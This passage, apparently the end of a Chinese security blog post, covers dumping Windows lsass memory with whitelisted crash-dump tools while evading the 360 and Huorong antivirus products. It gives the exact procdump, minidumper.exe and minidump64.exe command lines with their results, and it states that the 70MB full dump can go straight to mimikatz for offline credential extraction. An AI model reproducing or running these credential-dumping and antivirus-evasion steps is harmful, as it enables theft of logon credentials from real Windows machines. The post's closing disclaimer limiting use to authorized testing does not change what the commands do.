+<h3 id="5-1-正控制对照：先证明”环境本身能转储”"><a href="#5-1-正控制对照：先证明”环境本身能转储”" class="headerlink" title="5.1 正控制对照：先证明”环境本身能转储”"></a>5.1 正控制对照：先证明”环境本身能转储”</h3><p>严谨起见，先用已知的白名单工具跑一遍正控制——确认这台机器在正常情况下本来就能转储 lsass，否则后面的一切验证都没有意义。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">procdump.exe -ma &lt;lsass_PID&gt; procdump_test.dmp<br>→ procdump_test.dmp = 82MB（全内存，正控制 ✓）<br></code></pre></td></tr></table></figure>
+
+<p>正控制成立，主角上场。</p>
+<h3 id="5-2-minidumper-exe：全内存转储，一步到位"><a href="#5-2-minidumper-exe：全内存转储，一步到位" class="headerlink" title="5.2 minidumper.exe：全内存转储，一步到位"></a>5.2 minidumper.exe：全内存转储，一步到位</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">minidumper.exe -n -t 0x2 lsass_gitmd 1468<br>→ lsass_gitmd.dmp = 70,837,325 字节（约 70MB）<br>→ 魔数 &#x27;MDMP&#x27; ✓，Flags=0x220002（含 FullMemory）✓<br>→ dump 内含 lsass / LSA 内存 ✓<br>→ 转储后 lsass 进程仍存活（-n 生效）✓<br></code></pre></td></tr></table></figure>
+
+<p><strong>70MB 全内存 dmp，可以直接丢给 mimikatz 这类工具做离线凭据提取。</strong></p>
+<h3 id="5-3-minidump64-exe：轻量转储，不能做凭据提取"><a href="#5-3-minidump64-exe：轻量转储，不能做凭据提取" class="headerlink" title="5.3 minidump64.exe：轻量转储，不能做凭据提取"></a>5.3 minidump64.exe：轻量转储，不能做凭据提取</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">minidump64.exe 1468 C:\...\lsass_md64.dmp<br>→ 83,398 字节，魔数 &#x27;MDMP&#x27; ✓（轻量，不含完整堆，不适合凭据提取）<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-4-顺带发现的本机特性：32-位-dump-栈是”坏”的"><a href="#5-4-顺带发现的本机特性：32-位-dump-栈是”坏”的" class="headerlink" title="5.4 顺带发现的本机特性：32 位 dump 栈是”坏”的"></a>5.4 顺带发现的本机特性：32 位 dump 栈是”坏”的</h3><p>验证过程中还发现一个值得单独记录的现象：<strong>本机的 32 位 dump 栈是失效的</strong>——32 位 <code>dbghelp!MiniDumpWriteDump</code> 产物为 0 字节，连 SysWOW64 下的 comsvcs.dll 同样输出 0 字节，而 64 位完全正常。怀疑是有安全产品对 32 位 dbghelp 做了干预。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li>奇安信攻防社区 - Windows lsass 转储篇：<a target="_blank" rel="noopener" href="https://mdr.skyeye.qianxin.com/forum/share/2434">https://mdr.skyeye.qianxin.com/forum/share/2434</a></li>
+<li>LOLBAS 项目：<a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></li>
+<li>Windows 错误报告（WER）官方文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/wer/wer-reference">https://learn.microsoft.com/zh-cn/windows/win32/wer/wer-reference</a></li>
+</ol>
+<hr>
+<blockquote>
+<p>写在最后：以上内容仅供安全研究与授权测试学习使用。白名单工具本身无罪，滥用有罪。请勿对未经授权的目标进行任何形式的检测与攻击。</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/" class="print-no-link">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LOLBins ：借崩溃转储白名单程序，绕过 360 核晶 和火绒拿下 lsass</div>
+      <div>http://example.com/2026/08/15/LOLBins-：借崩溃转储白名单程序，绕过-360-核晶-和火绒拿下-lsass/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 15, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/05/30/%E3%80%8Aring3%E5%B1%82%E6%91%98%E5%8F%96%E4%BB%A4%E7%89%8C%E8%87%B4%E7%9B%B2%E7%81%AB%E7%BB%92%E3%80%8B/" title="《ring3层摘取令牌致盲火绒》">
+                        <span class="hidden-mobile">《ring3层摘取令牌致盲火绒》</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
